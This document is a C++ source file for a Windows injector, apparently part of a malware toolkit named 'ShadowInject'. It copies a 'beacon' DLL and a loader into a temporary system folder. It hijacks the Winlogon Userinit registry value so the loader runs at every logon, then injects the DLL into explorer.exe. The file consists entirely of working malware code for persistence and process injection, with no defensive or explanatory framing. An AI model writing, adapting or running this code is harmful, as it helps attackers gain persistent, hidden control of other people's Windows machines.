#include "common.h"
#include <iostream>

void AddPersistence(const std::string &exePath)
{
	wchar_t wPath[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, exePath.c_str(), -1, wPath, MAX_PATH);

	HKEY hKey;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
					  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
					  0, KEY_READ | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
	{
		wchar_t current[2048] = L"";
		DWORD size = sizeof(current);
		DWORD type = REG_SZ;
		if (RegQueryValueExW(hKey, L"Userinit", NULL, &type, (BYTE *)current, &size) == ERROR_SUCCESS)
		{
			std::wstring str(current);
			if (str.find(L"loader.exe") == std::wstring::npos)
			{
				wchar_t newVal[4096];
				wsprintfW(newVal, L"%s, %s", current, wPath);
				RegSetValueExW(hKey, L"Userinit", 0, REG_SZ, (BYTE *)newVal, wcslen(newVal) * 2);

				Log("[+] Userinit modified");
			}
		}
		RegCloseKey(hKey);
	}
}

int main()
{
	Log("[*] Injector started");

	CreateDirectoryW(L"C:\\Windows\\Temp\\ShadowInject", NULL);

	Log("[+] Folder ready");

	const char *files[][2] = {
		{"beacon.dll", INSTALL_PATH DLL_NAME},
		{"loader.exe", INSTALL_PATH LOADER_NAME}};

	for (int i = 0; i < 2; i++)
	{
		if (!FileExists(files[i][1]))
		{
			if (CopyFileA(files[i][0], files[i][1], FALSE))
			{
				Log(("[+] Copied: " + std::string(files[i][0])).c_str());
			}
		}
	}

	AddPersistence(GetLoaderPath());

	DWORD pid = GetPidByName(L"explorer.exe");
	if (pid)
	{
		if (InjectDll(pid, GetDllPath()))
		{
			Log("[+] Injection successful!");
		}
	}

	Log("[*] Injector finished");

	return 0;
}